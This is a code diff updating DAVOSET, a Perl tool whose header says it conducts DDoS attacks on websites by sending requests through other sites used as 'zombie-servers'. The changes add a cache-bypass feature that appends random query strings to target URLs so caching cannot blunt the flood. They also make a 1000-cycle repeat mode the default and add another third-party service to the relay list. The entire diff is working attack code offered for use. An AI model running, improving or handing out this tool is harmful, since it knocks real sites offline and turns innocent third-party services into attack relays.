@@ -1,24 +1,25 @@
 #!/usr/bin/perl
 # DDoS attacks via other sites execution tool
-# DAVOSET v.1.2.4
+# DAVOSET v.1.2.5
 # Tool for conducting of DDoS attacks on the sites via other sites
 # Copyright (C) MustLive 2010-2015
-# Last update: 31.03.2015
+# Last update: 30.06.2015
 # http://websecurity.com.ua
 #############################################
 # Settings
-my $version = "1.2.4"; # program version
+my $version = "1.2.5"; # program version
 my $agent = "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1)"; # user agent
 my $default_port = "80"; # default port of the host
 my $show_stat = 1; # show statistic of work
 my $default_site = ""; # default site for attack
 my $testURL = "http://www.google.com"; # default site for testing botnet
 my $list_servers = "list_full.txt"; # list of zombie-servers
-my $mode = "0"; # 0 - standard mode, 1 - cyclic mode
-my $cycles = "10"; # number of cycles in cyclic mode
+my $mode = "1"; # 0 - standard mode, 1 - cyclic mode
+my $cycles = "1000"; # number of cycles in cyclic mode
 my $max_cycles = "1000"; # maximum number of cycles in cyclic mode
 my $log = 1; # 0 - turn off, 1 - turn on logging
 my $log_file = "logs.txt"; # log with results of work
+my $cache = 0; # cache bypass
 my $proxy = 0; # 0 - no proxy, 1 - Socks proxy
 my $proxyserver = ""; # Socks server
 my $proxyport = "1080"; # Socks port
@@ -56,6 +57,14 @@ if ($#ARGV >= 0) {
 			}
 			else {
 				$log = 0;
+			}
+		}
+		elsif ($ARGV[$i] =~ /^b=(\d+)$/) { # cache bypass
+			if ($1 == 1) {
+				$cache = 1;
+			}
+			else {
+				$cache = 0;
 			}
 		}
 	}
@@ -160,6 +169,15 @@ sub Attack { # send request to zombie-server
 	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap2_kmlprxy.php/);
 	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap3_kmlprxy.php/);
 	$site = "http://$site" if ($site !~ /^https?:/ && CheckURL($url));
+	if ($cache) {
+		$site .= "/" if ($site !~ /\/$/);
+		if ($site =~ /\?/ || $site =~ /%3F/) {
+			$site .= "%26" . int(rand(time));
+		}
+		else {
+			$site .= "%3F" . int(rand(time));
+		}
+	}
 	if ($method eq "WP") {
 		$url =~ m|(https?://[^/]+)(/.+/)?([^/]+)?|;
 		$host = $1;
@@ -292,6 +310,15 @@ sub TestServer { # test zombie-server
 	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap2_kmlprxy.php/);
 	$site =~ s|^https?://|| if ($url =~ /plugin_googlemap3_kmlprxy.php/);
 	$site = "http://$site" if ($site !~ /^https?:/ && CheckURL($url));
+	if ($cache) {
+		$site .= "/" if ($site !~ /\/$/);
+		if ($site =~ /\?/ || $site =~ /%3F/) {
+			$site .= "%26" . int(rand(time));
+		}
+		else {
+			$site .= "%3F" . int(rand(time));
+		}
+	}
 	if ($method eq "WP") {
 		$url =~ m|(https?://[^/]+)(/.+/)?([^/]+)?|;
 		$host = $1;
@@ -469,5 +496,6 @@ sub CheckURL { # web sites which require "http" for target URL
 	return 1 if ($url =~ m|^http://anonymouse.org|);
 	return 1 if ($url =~ m|^http://validator.w3.org|);
 	return 1 if ($url =~ m|^http://www.netvibes.com|);
+	return 1 if ($url =~ m|^http://services.w3.org|);	
 	return 0;
 }
